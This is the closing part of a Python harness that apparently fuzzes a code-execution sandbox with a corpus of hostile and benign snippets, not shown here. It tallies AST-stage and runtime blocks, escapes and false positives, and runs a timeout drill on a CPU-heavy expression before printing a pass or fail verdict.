    print("corpus: {} hostile payloads + {} benign controls".format(len(hostile), len(benign)))

    records = []
    ast_time_total = 0.0
    runtime_time_total = 0.0
    n_blocked_ast = 0
    n_blocked_runtime = 0
    n_escaped = 0
    n_fp = 0
    n_runaway = 0
    escapes = []
    false_positives = []

    for p in corpus:
        rec = {"id": p.pid, "category": p.category, "desc": p.desc,
               "expect_allow": p.expect_allow, "code": p.code}
        # ---- stage 1: static AST gate ----
        t0 = time.perf_counter()
        ast_reason = None
        try:
            check_ast(p.code)
        except SandboxSecurityError as exc:
            ast_reason = str(exc)
        except SyntaxError:
            ast_reason = "syntax-error"
        ast_us = (time.perf_counter() - t0) * 1e6
        ast_time_total += ast_us
        rec["ast"] = "rejected" if ast_reason is not None else "passed"
        if ast_reason == "syntax-error":
            rec["ast"] = "syntax-error"
        rec["ast_reason"] = ast_reason

        # ---- stage 2: isolated runtime audit ----
        run = None
        if not args.ast_only:
            t0 = time.perf_counter()
            run = runtime_audit(p.code,
                                host="127.0.0.1" if p.listener else None,
                                port=canary_port)
            runtime_time_total += (time.perf_counter() - t0) * 1e3
            rec["runtime_status"] = run["status"]
            rec["runtime_error"] = run.get("error", "")
            rec["canary_hit"] = run.get("canary_hit", False)
            rec["listener_hit"] = run.get("listener_hit", False)
            rec["runaway_child"] = run.get("runaway_child", False)

        if p.expect_allow:
            verdict = "benign-ok"
            if ast_reason is not None:
                verdict = "FALSE-POSITIVE"
                n_fp += 1
                false_positives.append(rec)
            elif run is not None and run["status"] not in ("ok", "rejected"):
                verdict = "BENIGN-RUNTIME-FAIL"
                n_fp += 1
                false_positives.append(rec)
        else:
            verdict = classify_hostile(p, ast_reason, run if not args.ast_only else None)
            if verdict == "blocked-ast":
                n_blocked_ast += 1
            elif verdict == "blocked-runtime":
                n_blocked_runtime += 1
                if rec.get("runaway_child"):
                    n_runaway += 1
            elif verdict == "ESCAPED":
                n_escaped += 1
                escapes.append(rec)
        rec["verdict"] = verdict
        records.append(rec)
        if args.verbose:
            cat_short = p.category.split(". ")[1] if ". " in p.category else p.category
            line = "[{:<4}] {:<20} {:<42} ast={:<13}".format(
                p.pid, cat_short, p.desc[:42], rec["ast"])
            if run is not None:
                line += " rt={:<14} {}".format(run["status"], verdict)
            else:
                line += " " + verdict
            print(line)
            if ast_reason and ast_reason != "syntax-error":
                print("        reason: {}".format(ast_reason))

    # ---- process-isolation drill: the GIL bomb no thread breaker could stop ----
    drill = {"performed": False, "passed": True}
    if not args.ast_only:
        from app.tools.dynamic_sandbox import (
            execute_safe_python as _run_snippet,
            shutdown_sandbox_pool as _stop_pool,
        )

        _run_snippet("1 + 1")  # warm the pool
        t0 = time.perf_counter()
        bomb = _run_snippet("sum(range(10 ** 9))", timeout=1.0)
        kill_wall = time.perf_counter() - t0
        follow = _run_snippet("21 * 2")
        drill = {
            "performed": True,
            "bomb_status": bomb.get("status"),
            "bomb_error": str(bomb.get("error", ""))[:160],
            "kill_wall_seconds": round(kill_wall, 3),
            "pool_alive_after_kill": follow.get("status") == "ok"
            and follow.get("result") == "42",
        }
        drill["passed"] = (
            drill["bomb_status"] == "timeout"
            and drill["kill_wall_seconds"] < 15.0
            and drill["pool_alive_after_kill"]
        )
        _stop_pool()

    # ---- summary ----
    total = len(hostile)
    wall = ast_time_total / 1e6 + runtime_time_total / 1e3
    ast_rate = 100.0 * n_blocked_ast / total if total else 0.0
    contained = n_blocked_ast + n_blocked_runtime
    sandbox_rate = 100.0 * contained / total if total else 0.0

    print("-" * 78)
    print("RESULT SUMMARY")
    print("  hostile payloads            : {}".format(total))
    print("  benign controls             : {}".format(len(benign)))
    print("  blocked at AST stage        : {}  ({:.1f}%)".format(n_blocked_ast, ast_rate))
    print("  contained at runtime stage  : {}".format(n_blocked_runtime))
    print("  runaway-thread residency    : {}  (breaker fired; abandoned thread wedged child exit)".format(n_runaway))
    print("  ESCAPED (false negatives)   : {}   <-- MUST BE 0".format(n_escaped))
    print("  sandbox-level interception  : {:.1f}%".format(sandbox_rate))
    print("  benign false positives      : {}   <-- MUST BE 0".format(n_fp))
    if drill.get("performed"):
        print("  GIL-bomb drill (process pool): status={} kill_wall={}s pool_alive={}".format(
            drill["bomb_status"], drill["kill_wall_seconds"], drill["pool_alive_after_kill"]))
    print("  AST check time              : total {:.1f} ms, avg {:.1f} us/payload".format(
        ast_time_total / 1e3, ast_time_total / max(1, len(corpus))))
    if not args.ast_only:
        print("  runtime audit time          : total {:.1f} s".format(runtime_time_total / 1e3))
    print("  wall clock                  : {:.1f} s".format(wall))

    per_cat = {}
    for r in records:
        c = per_cat.setdefault(r["category"], {"total": 0, "ast": 0, "rt": 0, "esc": 0})
        c["total"] += 1
        if r["verdict"] == "blocked-ast":
            c["ast"] += 1
        elif r["verdict"] == "blocked-runtime":
            c["rt"] += 1
        elif r["verdict"] == "ESCAPED":
            c["esc"] += 1
    print("-" * 78)
    print("PER-CATEGORY BREAKDOWN")
    for cat, c in sorted(per_cat.items()):
        print("  {:<28} total={:<4} ast-blocked={:<4} runtime-contained={:<4} escaped={}".format(
            cat, c["total"], c["ast"], c["rt"], c["esc"]))

    if escapes:
        print("-" * 78)
        print("ESCAPED PAYLOADS (false negatives) -- detail")
        for r in escapes:
            print("  [{}] {} :: {}".format(r["id"], r["desc"], r["verdict"]))
            print("       code: {}".format(r["code"].replace("\n", " ; ")[:110]))
            print("       ast: {} | runtime: {} | canary={} listener={}".format(
                r["ast"], r.get("runtime_status"), r.get("canary_hit"), r.get("listener_hit")))
    if false_positives:
        print("-" * 78)
        print("BENIGN FALSE POSITIVES -- detail")
        for r in false_positives:
            print("  [{}] {} :: ast={} rt={}".format(
                r["id"], r["desc"], r["ast"], r.get("runtime_status")))

    summary = {
        "total_hostile": total, "benign_controls": len(benign),
        "blocked_ast": n_blocked_ast, "blocked_runtime": n_blocked_runtime,
        "runaway_thread_residency": n_runaway,
        "escaped": n_escaped, "sandbox_interception_pct": sandbox_rate,
        "process_isolation_drill": drill,
        "ast_interception_pct": ast_rate,
        "benign_false_positives": n_fp,
        "ast_time_total_ms": ast_time_total / 1e3,
        "ast_time_avg_us": ast_time_total / max(1, len(corpus)),
        "runtime_audit_total_s": runtime_time_total / 1e3,
        "wall_clock_s": wall,
    }
    write_results(records, summary)
    print("results written to data/security_fuzzing_last_run.json")

    print("=" * 78)
    if n_escaped == 0 and n_fp == 0 and drill.get("passed", True):
        print("VERDICT: PASS -- sandbox held the line (0 escapes, 0 benign false positives)")
        return 0
    print("VERDICT: FAIL -- {} escape(s), {} false positive(s): sandbox needs hardening".format(
        n_escaped, n_fp))
    return 1


if __name__ == "__main__":
    sys.exit(main())
